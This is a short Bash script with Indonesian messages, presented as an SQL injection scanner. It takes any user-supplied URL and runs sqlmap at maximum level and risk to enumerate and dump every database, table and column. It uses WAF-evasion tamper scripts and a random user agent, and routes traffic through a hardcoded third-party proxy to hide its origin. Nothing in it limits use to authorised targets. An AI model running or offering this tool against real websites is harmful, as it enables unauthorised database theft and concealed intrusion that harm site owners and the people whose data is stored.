#!/bin/bash

# Warna
red='\e[91m'
green='\e[92m'
yellow='\e[93m'
cyan='\e[96m'
reset='\e[0m'

# Tampilan
clear
echo -e "${cyan}  >>> SUPER SQL INJECTION SCANNER <<<${reset}"
echo ""

# Loading
loading_bar() {
    bar=">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
    for i in {1..35}; do
        echo -ne "\r${yellow}[*] Bentar Scan Dulu ${bar:0:$i}${reset}"
        sleep 0.05
    done
    echo -e "\n"
}

read -p "$(echo -e ${green}"-->> [ LINK WEB ] : "${reset})" target

# URL Validasi
if [[ "$target" != *"="* ]]; then
    echo -e "${red}[!] ERROR: PARAMETER TIDAK ADA (index.php?id=1)${reset}"
    exit 1
fi

# Scan
echo -e "${green}>> SCAN DI GASIN <<${reset}"
loading_bar

# Scan SQL Injection dengan bypass SSL error
sqlmap -u "$target" --batch --dbs --tables --columns --dump \
--level=5 --risk=3 --threads=10 --random-agent \
--ignore-ssl-errors --flush-session \
--tamper=between,randomcase,space2comment,charencode \
--proxy="http://190.97.239.170:1080" \
--technique=BEUSTQ --batch

# Sukses
echo -e "${green}[✔] Sudah Bos${reset}"
